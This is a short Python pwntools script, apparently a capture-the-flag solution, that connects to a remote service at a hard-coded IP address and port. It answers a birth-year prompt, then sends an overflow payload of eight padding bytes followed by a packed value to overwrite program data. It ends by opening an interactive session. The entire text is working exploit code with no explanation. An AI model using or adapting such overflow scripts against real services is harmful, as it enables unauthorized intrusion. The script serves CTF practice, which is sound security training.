from pwn import *
context.log_level = 'debug'

p="./elf"

context.binary=p
#io=process(p)
io=remote("111.198.29.45",35615)

io.recvuntil("What's Your Birth?")
io.sendline("1924")
io.recvuntil("What's Your Name?")
io.sendline("a"*8+p32(0x786))

io.interactive()
